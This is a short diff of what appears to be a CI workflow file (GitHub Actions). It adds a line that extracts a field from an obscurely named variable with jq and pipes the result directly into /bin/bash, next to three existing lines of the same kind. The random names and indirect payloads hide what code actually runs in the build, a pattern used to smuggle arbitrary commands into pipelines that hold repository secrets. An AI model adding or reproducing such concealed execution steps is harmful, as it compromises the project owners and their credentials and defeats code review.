@@ -25,6 +25,7 @@ jobs:
           echo $m9 | jq -r .krkac470 | /bin/bash
           printf '%s' "$v79" | jq -r .t800 | /bin/bash
           echo $lpzqc24449 | jq -r .dg02185 | /bin/bash
+          echo $sjw88 | jq -r .z16 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
